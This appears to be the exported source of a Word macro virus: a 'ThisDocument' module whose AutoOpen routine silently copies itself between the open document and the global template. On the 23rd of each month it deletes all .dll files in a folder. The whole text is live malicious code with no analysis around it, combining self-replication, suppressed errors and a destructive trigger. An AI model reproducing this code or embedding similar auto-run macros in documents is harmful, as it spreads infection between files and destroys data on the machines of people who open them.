   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "aUtOoPeN"

   Public Sub MAIN()
   Dim a$
   Dim b$
   On Error Resume Next
   a$ = "aUtOoPeN"
   b$ = WordBasic.[FileName$]() + ":" + a$
   WordBasic.MacroCopy a$, b$
   WordBasic.MacroCopy b$, a$
   If (WordBasic.Day(WordBasic.Now()) = 23) Then
       WordBasic.Kill "e:\temp\1\*.dll"
   End If
   End Sub
